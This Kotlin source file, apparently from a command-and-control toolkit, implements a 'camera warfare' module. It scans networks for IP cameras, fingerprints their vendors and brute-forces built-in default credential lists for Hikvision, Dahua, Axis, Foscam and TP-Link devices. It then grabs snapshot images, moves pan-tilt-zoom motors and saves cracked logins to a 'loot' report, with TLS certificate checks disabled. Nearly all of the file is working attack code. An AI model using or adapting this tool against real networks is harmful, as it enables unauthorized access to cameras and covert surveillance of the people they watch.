package com.projectzerodays.quantumcli.ops

import com.projectzerodays.quantumcli.c2.C2State
import com.projectzerodays.quantumcli.c2.CameraHit
import java.io.File
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.HttpURLConnection
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.SocketTimeoutException
import java.net.URL
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.X509TrustManager
import org.json.JSONArray
import org.json.JSONObject

/** CAMERA WARFARE ENGINE parity — discovery, vendor intel, cred checks. */
object CamWar {

    val CAM_PORTS: List<Int> = listOf(
        80, 443, 554, 37777, 37778, 8000, 8001, 8080, 8081, 8899,
        34567, 34571, 34599, 5000
    )

    private const val ONVIF_DEVICE_NS = "http://www.onvif.org/ver10/device/wsdl"
    private const val ONVIF_PTZ_NS = "http://www.onvif.org/ver20/ptz/wsdl"
    private const val ONVIF_SCHEMA_NS = "http://www.onvif.org/ver10/schema"

    private val VENDOR_HINTS: List<Pair<String, List<String>>> = listOf(
        "hikvision" to listOf("hikvision", "webcomponents", "doc/page/login", "www-uc", "embedded_net_dvr", "netdvr", "hik-"),
        "dahua" to listOf("dahua", "login_module.js", "netkeyboard", "dvrdvs", "dss"),
        "axis" to listOf("axis", "axis-cgi"),
        "foscam" to listOf("foscam", "cgi-bin/hi3510", "get_params.cgi", "ipcam"),
        "tplink" to listOf("tapo", "tplink"),
        "generic" to listOf("ipcamera", "netcam", "webcam", "rtsp"),
    )

    val CREDS: Map<String, List<Pair<String, String>>> = mapOf(
        "hikvision" to listOf(
            "admin" to "admin", "admin" to "12345", "admin" to "888888",
            "admin" to "66668888", "admin" to "Admin123", "admin" to ""
        ),
        "dahua" to listOf(
            "admin" to "admin", "admin" to "admin1234", "888888" to "888888",
            "admin" to "123456"
        ),
        "axis" to listOf(
            "root" to "pass", "root" to "root", "admin" to "1234", "admin" to "admin"
        ),
        "foscam" to listOf("admin" to "", "admin" to "admin", "admin" to "12345", "admin" to "888888"),
        "tplink" to listOf("admin" to "admin", "admin" to "password"),
        "generic" to listOf(
            "admin" to "admin", "admin" to "12345", "admin" to "", "root" to "root",
            "user" to "user", "guest" to "guest", "888888" to "888888"
        ),
    )

    private val INFO_ENDPOINTS: Map<String, Pair<String, String>> = mapOf(
        "hikvision" to ("/ISAPI/System/deviceInfo" to "digest"),
        "dahua" to ("/cgi-bin/magicBox.cgi?action=getSystemInfo" to "digest"),
        "axis" to ("/axis-cgi/param.cgi?action=list" to "basic"),
        "foscam" to ("/get_params.cgi" to "basic"),
        "generic" to ("/" to "basic"),
    )

    private val SNAPSHOT: Map<String, List<Pair<String, String>>> = mapOf(
        "hikvision" to listOf(
            "/ISAPI/Streaming/channels/101/picture" to "digest",
            "/ISAPI/Streaming/channels/1/picture" to "digest",
            "/ISAPI/System/Video/inputs/channels/1/picture" to "digest"
        ),
        "dahua" to listOf(
            "/cgi-bin/snapshot.cgi" to "digest",
            "/cgi-bin/snapshot.cgi?channel=1" to "digest"
        ),
        "axis" to listOf("/axis-cgi/jpg/image.cgi?resolution=640x480" to "basic"),
        "foscam" to listOf("/snapshot.cgi" to "basic"),
        "generic" to listOf(),
    )

    val GENERIC_SNAPSHOTS: List<Pair<String, String>> = listOf(
        "/snapshot.cgi" to "basic",
        "/image.jpg" to "basic",
        "/snap.jpg" to "basic",
        "/snapshot.jpg" to "basic",
        "/onvif-http/snapshot.jpg" to "basic",
        "/cgi-bin/snapshot.cgi" to "digest",
        "/ISAPI/Streaming/channels/101/picture" to "digest",
        "/tmpfs/snap.jpg" to "basic",
        "/webcapture.jpg?command=snap&channel=1" to "basic",
    )

    /** One per-vendor PTZ route: HTTP verb, spec auth column, action -> (path, body). */
    private class PtzRoute(
        val method: String,
        val auth: String,
        val path: (String) -> String,
        val body: (String) -> String?,
    )

    /**
     * Per-vendor PTZ nudge table — spec CamWarEngine.PTZ (dist/quantum-cli-v3.1-single.py
     * L2469-2475), expanded per action (up|down|left|right|stop). "onvif" is the
     * generic route: ONVIF SOAP ContinuousMove/Stop over the device service.
     */
    private val PTZ: Map<String, PtzRoute> = mapOf(
        "hikvision" to PtzRoute(
            "put", "digest",
            { "/ISAPI/PTZCtrl/channels/1/continuous" },
            { a -> ptzHikBody(a) },
        ),
        "dahua" to PtzRoute(
            "get", "digest",
            { a ->
                "/cgi-bin/ptz.cgi?action=${if (a == "stop") "stop" else "start"}" +
                    "&code=${ptzDahuaCode(a)}&arg1=1&arg2=1&channel=1"
            },
            { null },
        ),
        "axis" to PtzRoute(
            "get", "basic",
            { a -> "/axis-cgi/com/ptz.cgi?move=$a" },
            { null },
        ),
        "foscam" to PtzRoute(
            "get", "basic",
            { a -> "/decoder_control.cgi?command=${ptzFoscamCmd(a)}" },
            { null },
        ),
        "onvif" to PtzRoute(
            "soap", "basic",
            { "/onvif/device_service" },
            { a -> ptzOnvifBody(a) },
        ),
    )

    private val PTZ_ACTIONS = setOf("up", "down", "left", "right", "stop")

    fun vendorFromStr(s: String?): String {
        val low = (s ?: "").lowercase()
        for ((vendor, hints) in VENDOR_HINTS) {
            if (hints.any { low.contains(it) }) return vendor
        }
        return if (low.contains("vivotek")) "vivotek" else "unknown"
    }

    /** Raw WS-Discovery reply before ONVIF enrichment. */
    private class WsHit(val vendor: String, val model: String?, val onvifPort: Int?)

    /**
     * ONVIF WS-Discovery multicast probe (NetworkVideoTransmitter + Device).
     * Each hit is enriched with a SOAP GetDeviceInformation probe and the
     * onvif:// Scopes model/hardware hints (spec wsdiscovery_cameras +
     * onvif_device_info, dist/quantum-cli-v3.1-single.py L2380-2408).
     */
    fun wsDiscovery(timeoutSec: Int = 5): List<CameraHit> {
        val probe = (
            "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" " +
                "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" " +
                "xmlns:d=\"http://schemas.xmlsoap.org/ws/2005/04/discovery\" " +
                "xmlns:dn=\"http://www.onvif.org/ver10/network/wsdl\">" +
                "<s:Header>" +
                "<a:MessageID>urn:uuid:" + UUID.randomUUID() + "</a:MessageID>" +
                "<a:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</a:To>" +
                "<a:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</a:Action>" +
                "</s:Header>" +
                "<s:Body><d:Probe>" +
                "<d:Types>dn:NetworkVideoTransmitter tds:Device</d:Types>" +
                "<d:Scopes/>" +
                "</d:Probe></s:Body></s:Envelope>"
            ).toByteArray(Charsets.UTF_8)

        val raw = LinkedHashMap<String, WsHit>()
        try {
            DatagramSocket().use { s ->
                s.broadcast = true
                s.soTimeout = 500
                val pkt = DatagramPacket(
                    probe, probe.size,
                    InetAddress.getByName("239.255.255.250"), 3702
                )
                s.send(pkt)
                val end = System.currentTimeMillis() + timeoutSec * 1000L
                val buf = ByteArray(65535)
                while (System.currentTimeMillis() < end) {
                    val rx = DatagramPacket(buf, buf.size)
                    try {
                        s.receive(rx)
                    } catch (e: SocketTimeoutException) {
                        continue
                    }
                    val txt = String(buf, 0, rx.length, Charsets.UTF_8)
                    val ip = Regex("http://([0-9.]+):?[0-9]*").find(txt)?.groupValues?.get(1)
                        ?: rx.address.hostAddress
                    if (ip != null) {
                        val prev = raw[ip]
                        val vendor = if (prev != null && prev.vendor != "unknown") prev.vendor else vendorFromStr(txt)
                        raw[ip] = WsHit(
                            vendor = vendor,
                            model = prev?.model ?: scopeModelHint(txt),
                            onvifPort = prev?.onvifPort ?: onvifPortFromReply(txt, ip),
                        )
                    }
                }
            }
        } catch (e: Exception) {
            // network unavailable mid-probe; keep whatever was collected
        }

        val found = LinkedHashMap<String, CameraHit>()
        for ((ip, hit) in raw) {
            var vendor = hit.vendor
            var model = hit.model
            val info = onvifDeviceInfo(ip, listOfNotNull(hit.onvifPort, 80, 8899).distinct())
            if (info != null) {
                if (model == null) model = info["model"]
                if (vendor == "unknown") {
                    // fold the SOAP Manufacturer into vendor detection when the
                    // discovery reply alone did not identify the maker
                    info["manufacturer"]?.let { m -> vendor = vendorFromStr(m) }
                }
            }
            found[ip] = CameraHit(
                ip = ip,
                vendor = vendor,
                ports = listOf(80),
                source = "ws-discovery",
                model = model
            )
        }
        return found.values.toList()
    }

    /**
     * Full camera sweep: WS-Discovery + CIDR port scan over CAM_PORTS with
     * vendor banner detection and optional default-credential checks. Writes
     * the camwar_<cidr>_<ts>.json report artifact on completion (spec
     * pwn_network report block, dist/quantum-cli-v3.1-single.py L2698-2718).
     */
    fun discover(cidr: String?, bruteCreds: Boolean = false): List<CameraHit> {
        val hits = LinkedHashMap<String, CameraHit>()
        for (cam in wsDiscovery()) {
            hits[cam.ip] = cam
        }
        val scope = if (cidr.isNullOrBlank()) Net.localScope() else cidr
        val hosts = Net.cidrHosts(scope)
        val portHits = ConcurrentHashMap<String, MutableList<Int>>()
        Net.parMap(hosts, 32) { ip ->
            val open = CAM_PORTS.filter { Net.tcpProbe(ip, it, 400) }
            if (open.isNotEmpty()) {
                portHits[ip] = open.toMutableList()
            }
            null
        }
        for ((ip, ports) in portHits) {
            var vendor = "generic"
            var model: String? = null
            for (p in listOf(80, 443, 8000, 8080, 8081, 8899, 5000)) {
                if (!ports.contains(p)) continue
                val scheme = if (p == 443) "https" else "http"
                val r = Net.httpGet("$scheme://$ip:$p/", timeoutMs = 2000)
                if (r.error == null) {
                    val hay = r.text(2000) + " " + (r.headers["server"] ?: "")
                    val v = vendorFromStr(hay)
                    if (v != "unknown") {
                        vendor = v
                        break
                    }
                }
            }
            if (ports.contains(554)) {
                val rtsp = Net.banner(
                    ip, 554, 2000,
                    "OPTIONS rtsp://$ip:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n".toByteArray()
                )
                if (rtsp != null) {
                    val v = vendorFromStr(rtsp)
                    if (v != "unknown") vendor = v
                }
            }
            var creds: String? = null
            if (bruteCreds) {
                creds = checkCreds(ip, vendor)
            }
            if (vendor == "generic" && !ports.contains(554) && ports.none { it in CAM_PORTS }) {
                continue
            }
            hits[ip] = CameraHit(
                ip = ip,
                vendor = vendor,
                ports = ports.sorted(),
                source = "portscan",
                creds = creds,
                model = model
            )
        }
        val cams = hits.values.sortedBy { it.ip }
        try {
            val report = writeReport(scope, cams)
            C2State.audit("CAM", "CAM WAR: discovery report -> ${report.name} (${cams.size} cam(s) on $scope)")
        } catch (e: Exception) {
            // report write is best-effort (e.g. storage root not initialized);
            // the sweep result itself is unaffected
        }
        return cams
    }

    /** Try vendor default creds against the vendor info endpoint. */
    fun checkCreds(ip: String, vendor: String): String? {
        val endpoint = INFO_ENDPOINTS[vendor] ?: INFO_ENDPOINTS["generic"] ?: return null
        val (path, _) = endpoint
        for ((u, p) in CREDS[vendor] ?: CREDS["generic"] ?: return null) {
            val r = Net.httpGetAuth("http://$ip$path", u, p, timeoutMs = 2500)
            if (r.status in 200..299) {
                return "$u:$p"
            }
        }
        return null
    }

    /** Pull a snapshot frame (vendor + generic endpoints, basic/digest). */
    fun snapshot(ip: String, vendor: String, creds: String? = null): ByteArray? {
        val (user, pass) = if (creds != null && creds.contains(":")) {
            val parts = creds.split(":", limit = 2)
            parts[0] to parts.getOrElse(1) { "" }
        } else {
            "admin" to "admin"
        }
        val paths = (SNAPSHOT[vendor] ?: emptyList()) + GENERIC_SNAPSHOTS
        for ((path, _) in paths) {
            val r = Net.httpGetAuth("http://$ip$path", user, pass, timeoutMs = 3000)
            if (r.ok && r.body.size > 100) {
                val ct = r.headers["content-type"] ?: ""
                if (ct.contains("image", ignoreCase = true) || r.body[0] == 0xFF.toByte()) {
                    return r.body
                }
            }
        }
        return null
    }

    /**
     * PTZ nudge over the vendor control channel (spec control_cam PTZ block,
     * dist/quantum-cli-v3.1-single.py L2664-2678).
     *
     * @param action one of up|down|left|right|stop
     * @return true when the camera answered HTTP 200 to the move request
     */
    fun ptzNudge(ip: String, vendor: String, creds: String?, action: String): Boolean {
        val act = action.trim().lowercase()
        if (act !in PTZ_ACTIONS) return false
        val route = PTZ[vendor.lowercase()] ?: PTZ["onvif"] ?: return false
        val (user, pass) = ptzCreds(creds)
        val scheme = when {
            Net.tcpProbe(ip, 80, 400) -> "http"
            Net.tcpProbe(ip, 443, 400) -> "https"
            else -> "http"
        }
        val url = "$scheme://$ip${route.path(act)}"
        return when (route.method) {
            "put" -> {
                // spec: PUT move, hold 1s, then PUT re-center (pan 0 / tilt 0)
                val result = ptzRequest("PUT", url, user, pass, route.body(act), "application/xml", 5000)
                val moved = result.first == 200
                if (moved && act != "stop") {
                    Thread.sleep(1000)
                    ptzRequest("PUT", url, user, pass, ptzHikBody("stop"), "application/xml", 5000)
                }
                moved
            }
            "soap" -> ptzRequest(
                "POST", url, user, pass, route.body(act),
                "application/soap+xml; charset=utf-8", 5000
            ).first == 200
            else -> Net.httpGetAuth(url, user, pass, timeoutMs = 5000).status == 200
        }
    }

    /**
     * ONVIF GetDeviceInformation probe — SOAP POST to /onvif/device_service on
     * each candidate port (80 / 8899 / WS-Discovery XAddrs port); parses
     * Manufacturer / Model / FirmwareVersion / SerialNumber from the XML.
     * (spec onvif_device_info, dist/quantum-cli-v3.1-single.py L2393-2408)
     */
    fun onvifDeviceInfo(ip: String, ports: List<Int> = listOf(80, 8899)): Map<String, String>? {
        val body = (
            "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\">" +
                "<s:Body><GetDeviceInformation xmlns=\"$ONVIF_DEVICE_NS\"/>" +
                "</s:Body></s:Envelope>"
            ).toByteArray(Charsets.UTF_8)
        for (port in ports) {
            if (!Net.tcpProbe(ip, port, 800)) continue
            val r = Net.httpPost(
                "http://$ip:$port/onvif/device_service",
                body,
                mapOf("Content-Type" to "application/soap+xml; charset=utf-8"),
                5000
            )
            if (r.status !in 200..299) continue
            val txt = r.text()
            val out = LinkedHashMap<String, String>()
            for (k in listOf("Manufacturer", "Model", "FirmwareVersion", "SerialNumber")) {
                Regex(k + ">([^<]+)").find(txt)?.groupValues?.get(1)?.let { out[k.lowercase()] = it }
            }
            if (out.isNotEmpty()) return out
        }
        return null
    }

    /**
     * CamWar report artifact — loot/camwar_<cidr>_<epoch>.json with
     * {ts, cidr, found, cracked, cams:[{ip, vendor, ports, source, creds, model}]}.
     * (spec pwn_network summary block, dist/quantum-cli-v3.1-single.py L2698-2718)
     */
    fun writeReport(cidr: String, cams: List<CameraHit>): File {
        val ts = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
        val f = File(
            C2State.lootDir,
            "camwar_${cidr.replace("/", "_")}_${System.currentTimeMillis() / 1000}.json"
        )
        val camsArr = JSONArray()
        cams.forEach { c ->
            camsArr.put(
                JSONObject()
                    .put("ip", c.ip)
                    .put("vendor", c.vendor)
                    .put("ports", JSONArray(c.ports))
                    .put("source", c.source)
                    .put("creds", c.creds ?: JSONObject.NULL)
                    .put("model", c.model ?: JSONObject.NULL)
            )
        }
        val summary = JSONObject()
            .put("ts", ts)
            .put("cidr", cidr)
            .put("found", cams.size)
            .put("cracked", cams.count { it.creds != null })
            .put("cams", camsArr)
        f.parentFile?.mkdirs()
        f.writeText(summary.toString(2))
        return f
    }

    // ------------------------------------------------------------- PTZ internals

    /** HIKVISION continuous-move body per action; stop/re-center is pan 0 tilt 0. */
    private fun ptzHikBody(action: String): String {
        val (pan, tilt) = when (action) {
            "up" -> "0" to "60"
            "down" -> "0" to "-60"
            "left" -> "-60" to "0"
            "right" -> "60" to "0"
            else -> "0" to "0"
        }
        return "<PTZData><pan>$pan</pan><tilt>$tilt</tilt></PTZData>"
    }

    /** DAHUA ptz.cgi code per action (start/stop is carried by the action param). */
    private fun ptzDahuaCode(action: String): String = when (action) {
        "up" -> "Up"
        "down" -> "Down"
        "left" -> "Left"
        "right" -> "Right"
        else -> "Left" // stop rides on the last-motion code with action=stop
    }

    /** FOSCAM decoder_control.cgi command codes per action. */
    private fun ptzFoscamCmd(action: String): String = when (action) {
        "up" -> "0"
        "down" -> "4"
        "left" -> "6"
        "right" -> "8"
        else -> "2" // stop
    }

    /** ONVIF-generic SOAP ContinuousMove / Stop body (ver20 PTZ service). */
    private fun ptzOnvifBody(action: String): String {
        return if (action == "stop") {
            "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"><s:Body>" +
                "<Stop xmlns=\"$ONVIF_PTZ_NS\"><ProfileToken>1</ProfileToken></Stop>" +
                "</s:Body></s:Envelope>"
        } else {
            val (x, y) = when (action) {
                "up" -> "0" to "0.5"
                "down" -> "0" to "-0.5"
                "left" -> "-0.5" to "0"
                else -> "0.5" to "0"
            }
            "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"><s:Body>" +
                "<ContinuousMove xmlns=\"$ONVIF_PTZ_NS\"><ProfileToken>1</ProfileToken>" +
                "<Velocity><PanTilt x=\"$x\" y=\"$y\" " +
                "space=\"http://www.onvif.org/ver10/tptz/PanTiltSpaces/PositionGenericSpace\" " +
                "xmlns=\"$ONVIF_SCHEMA_NS\"/></Velocity>" +
                "</ContinuousMove></s:Body></s:Envelope>"
        }
    }

    private fun ptzCreds(creds: String?): Pair<String, String> =
        if (creds != null && creds.contains(":")) {
            val parts = creds.split(":", limit = 2)
            parts[0] to parts.getOrElse(1) { "" }
        } else {
            "admin" to "admin"
        }

    /**
     * PUT/POST with Basic auth, upgrading to Digest on challenge
     * (Net.httpGetAuth parity for non-GET verbs; https uses a permissive trust
     * store, matching the spec's verify=False posture on lab gear).
     */
    private fun ptzRequest(
        method: String,
        url: String,
        user: String,
        pass: String,
        body: String?,
        contentType: String?,
        timeoutMs: Int,
    ): Pair<Int, Map<String, String>> {
        val send = { auth: String? ->
            var conn: HttpURLConnection? = null
            try {
                val c = URL(url).openConnection() as HttpURLConnection
                conn = c
                c.requestMethod = method
                c.connectTimeout = timeoutMs
                c.readTimeout = timeoutMs
                if (c is HttpsURLConnection) {
                    val tm = object : X509TrustManager {
                        override fun checkClientTrusted(
                            chain: Array<X509Certificate>,
                            authType: String
                        ) {
                        }

                        override fun checkServerTrusted(
                            chain: Array<X509Certificate>,
                            authType: String
                        ) {
                        }

                        override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
                    }
                    val ctx = SSLContext.getInstance("TLS")
                    ctx.init(null, arrayOf(tm), SecureRandom())
                    c.sslSocketFactory = ctx.socketFactory
                    c.setHostnameVerifier { _, _ -> true }
                }
                auth?.let { c.setRequestProperty("Authorization", it) }
                contentType?.let { c.setRequestProperty("Content-Type", it) }
                if (body != null) {
                    c.doOutput = true
                    val b = body.toByteArray(Charsets.UTF_8)
                    c.setFixedLengthStreamingMode(b.size)
                    c.outputStream.use { it.write(b) }
                }
                val status = c.responseCode
                val headers = HashMap<String, String>()
                for ((k, v) in c.headerFields) {
                    if (k != null && v.isNotEmpty()) headers[k.lowercase()] = v.joinToString(", ")
                }
                status to headers
            } catch (e: Exception) {
                0 to emptyMap<String, String>()
            } finally {
                conn?.disconnect()
            }
        }
        val basic = "Basic " + java.util.Base64.getEncoder()
            .encodeToString("$user:$pass".toByteArray(Charsets.ISO_8859_1))
        val first = send(basic)
        if (first.first != 401) return first
        val challenge = first.second["www-authenticate"] ?: return first
        if (!challenge.trim().lowercase().startsWith("digest")) return first
        val digest = Net.digestAuthHeader(challenge, method, url, user, pass) ?: return first
        return send(digest)
    }

    // -------------------------------------------------------- ONVIF hint parsing

    /**
     * onvif:// scope hints — model preferred, hardware as fallback
     * (spec scope parsing, dist/quantum-cli-v3.1-single.py L2380-2387).
     */
    private fun scopeModelHint(txt: String): String? {
        val scopes = Regex("<[^>]*Scopes[^>]*>([^<]*)<").find(txt)?.groupValues?.get(1) ?: txt
        Regex("onvif\\.org/model/([^\"'\\s<]+)").find(scopes)?.groupValues?.get(1)?.let { return it }
        return Regex("onvif\\.org/hardware/([^\"'\\s<]+)").find(scopes)?.groupValues?.get(1)
    }

    /** ONVIF service port advertised in the reply's XAddrs (device IP only). */
    private fun onvifPortFromReply(txt: String, ip: String): Int? {
        val m = Regex("http://" + Regex.escape(ip) + ":(\\d+)").find(txt) ?: return null
        return m.groupValues[1].toIntOrNull()
    }
}
